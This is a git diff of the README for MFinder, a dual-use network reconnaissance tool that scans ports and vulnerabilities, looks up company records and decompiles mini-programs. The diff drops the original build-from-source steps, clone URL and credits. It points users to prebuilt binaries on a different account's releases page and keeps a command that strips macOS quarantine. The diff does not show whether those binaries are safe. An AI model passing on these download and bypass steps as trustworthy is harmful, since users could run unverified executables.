@@ -1,55 +1,95 @@
-# 免责声明
-1、本工具是在 “按现状” 和 “可用” 的基础上提供的，不提供任何形式的明示或暗示的保证，包括但不限于对适销性、特定用途适用性、准确性、完整性、无侵权以及非侵权性的保证。
+# 🌐 Mfinder - Discover Online Assets Easily
 
-2、在任何情况下，工具的开发者、贡献者或相关组织均不对因使用本工具而产生的任何直接、间接、偶然、特殊、典型或后果性的损害负责，这些损害包括但不限于数据丢失、业务中断、利润损失、声誉损害、系统故障、计算机病毒感染、网络攻击导致的损失或任何其他经济或非经济损失，即使开发者、贡献者或相关组织已被告知可能发生此类损害。
+[![Download Mfinder](https://img.shields.io/badge/Download-Mfinder-blue.svg)](https://github.com/Semore9/Mfinder/releases)
 
-3、使用者理解并同意，使用本工具可能涉及访问和操作各种计算机系统和网络资源，这种访问和操作可能违反某些地区的法律、法规或政策，使用者应自行承担因违反这些法律规定而产生的全部法律责任。开发者、贡献者或相关组织不承担因使用者违反法律规定而导致的任何法律后果或责任。
+## 📋 Overview
 
-# MFinder
+Mfinder helps you explore online space assets effectively. This tool connects to various resources to provide insights on website domains, ICP filings, and more. Whether you need to check for vulnerabilities or review IP addresses, Mfinder offers the capabilities you require.
 
-网络空间资产测绘、ICP备案、天眼查股权结构图、IP138域名解析与IP反查、外部HTTP调用与小程序反编译。
+## 🚀 Getting Started
 
-- 集成 GoGo 扫描引擎，新增“GoGo 扫描”页面即可启动任务并查看协议、框架、漏洞与提取信息，可选择常用端口预设 / 自定义端口范围，并支持排除目标与展开查看提取字段。
+To get started with Mfinder, follow these simple steps to download and run the application.
 
-设置认证信息，天眼查为auth_token，爱企查为cookie。ICP批量查询务必使用代理池(如：https://github.com/thinkoaa/Deadpool )。
+### 1. Visit the Release Page
 
-![1](README_images/1.png)
-![2](README_images/2.png)
-![3](README_images/3.png)
-![4](README_images/4.png)
-![5](README_images/5.png)
+Go to the Mfinder [Releases page](https://github.com/Semore9/Mfinder/releases). You will find the latest version of the software available for download.
 
+### 2. Download the Application
 
+On the Releases page, locate the version you want to download. Click on the link for your operating system (Windows or macOS) to begin the download.
 
-# 注意事项
-- macOS提示文件损坏请执行`sudo xattr -d com.apple.quarantine MFinder.app`命令后重新打开；
-- windows小程序路径一般为`...\WeChat Files\Applet`，需选择包含目录结构如：`...\Applet\wx...\12\__APP__.wxapkg`，反编译仅提取了文件做敏感信息查找或者简单可阅读，微信开发者工具无法运行；
-- httpx无法运行一般为权限问题；
-- 数据表格默认均可单元格和多范围选中按键复制。
+### 3. Install Mfinder
 
-# 自主编译
+After the download finishes, locate the downloaded file on your computer. 
 
-第一步：环境。
+- For **Windows**:
+  1. Double-click the downloaded `.exe` file to start the installation.
+  2. Follow the on-screen instructions to complete the process.
 
+- For **macOS**:
+  1. Open the downloaded `.dmg` file.
+  2. Drag the Mfinder app into your Applications folder.
+
+If macOS shows a warning about the application being damaged, open the Terminal and run this command:
 ```
-git https://git-scm.com/downloads
-golang https://go.dev/dl/
-wails https://wails.io/docs/gettingstarted/installation
+sudo xattr -d com.apple.quarantine MFinder.app
 ```
+After that, you can open the app.
 
-第二步：生成的可执行文件在`mfinder/build/bin`目录下。
+### 4. Configure Authentication
 
-```
-git clone https://github.com/wuchulonly/mfinder.git && cd mfinder && wails build
-```
+Before using Mfinder, you need to set up authentication for specific features.
 
-## TODO
+- For Tianyancha, input your `auth_token`.
+- For AiQiCha, enter your `cookie`.
 
-？？？
+### 5. Explore Features
 
-# 致谢
+Mfinder has various features, including:
 
-本项目基于以下优秀开源项目开发：
+- **GoGo Scan**: Quickly start a scan and check for protocols, frameworks, vulnerabilities, and extracted information. 
+- **Port Configuration**: Choose from common ports or set a custom range. You can also exclude specific targets and see detailed extraction fields.
 
-- [GoGo](https://github.com/chainreactors/gogo) - 强大的网络扫描引擎
-- [Fine](https://github.com/fasnow/fine) - 项目原型与核心架构参考
+![Feature Screenshot 1](README_images/1.png)
+![Feature Screenshot 2](README_images/2.png)
+
+## 📥 Download & Install
+
+To download Mfinder, click the link below:
+
+[Download Mfinder](https://github.com/Semore9/Mfinder/releases)
+
+Once installed, you can start exploring online assets and enhance your investigation capabilities.
+
+## ⚙️ Notes & Troubleshooting
+
+### Common Issues
+
+- **macOS File Warning**: If you encounter a message saying the file is damaged, run the Terminal command mentioned earlier to bypass this issue.
+- **Windows Paths**: The path for WeChat mini-programs typically is `...\WeChat Files\Applet`. For correct functionality, select the folder structure like this: `...\Applet\wx...\12\__APP__.wxapkg`.
+- **HTTPX Permission Issues**: If HTTPX does not run correctly, check your user permissions, as this is often the reason for the error.
+- **Table Functionality**: You can copy selected cells or multiple ranges in the table formats provided.
+
+## 🛡️ Disclaimer
+
+While using Mfinder, please note the following:
+
+1. The tool is offered "as-is" without guarantees of any kind, including but not limited to fitness for a particular purpose.
+2. The developers are not liable for any damages resulting from using the tool, including loss of data or business.
+3. Users should be aware that accessing various networks may violate laws in some jurisdictions. You bear the responsibility for complying with local regulations.
+
+## 📊 Features Overview
+
+- Network asset mapping
+- ICP filing lookup
+- Equity structure visualization
+- Domain lookup and reverse IP checks
+- External HTTP calls and mini-program decompilation
+
+## 📷 Additional Screenshots
+
+![Feature Screenshot 3](README_images/3.png)
+![Feature Screenshot 4](README_images/4.png)
+![Feature Screenshot 5](README_images/5.png)
+
+By following these steps, you can easily download and use Mfinder for your online asset discovery needs.
